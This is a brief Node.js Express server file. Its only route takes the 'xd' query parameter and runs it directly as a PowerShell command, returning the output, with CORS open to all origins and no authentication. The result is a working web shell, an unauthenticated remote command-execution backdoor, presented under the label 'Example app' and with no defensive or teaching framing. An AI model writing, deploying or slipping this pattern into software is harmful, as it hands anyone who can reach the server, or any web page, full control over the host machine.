const express = require('express');
const { exec } = require('child_process');
var cors = require('cors');
const app = express();
const port = 3000;

app.use(cors({ origin: '*' }));

app.get('/', (req, res) => {
  const param = req.query.xd;

  exec(
    `${req.query.xd}`,
    { shell: 'powershell.exe' },
    (error, stdout, stderr) => {
      res.send({ xd: stdout });
    }
  );

  //res.send({ xd: `Padn Debil: ${param}` });
});

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`);
});
